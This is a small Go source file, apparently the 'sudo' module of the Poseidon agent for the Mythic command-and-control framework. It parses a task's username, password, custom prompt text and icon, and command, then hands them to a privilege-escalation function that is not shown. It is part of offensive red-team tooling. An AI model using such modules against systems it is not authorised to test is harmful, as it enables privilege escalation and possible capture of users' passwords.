package sudo

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Username       string   `json:"username"`
	Password       string   `json:"password"`
	Args           []string `json:"args"`
	PromptText     string   `json:"prompt_text"`
	PromptIconPath string   `json:"prompt_icon_path"`
	Command        string   `json:"command"`
}

func Run(task structs.Task) {
	msg := task.NewResponse()
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	sudoWithPromptOption(task, args)
	return

}
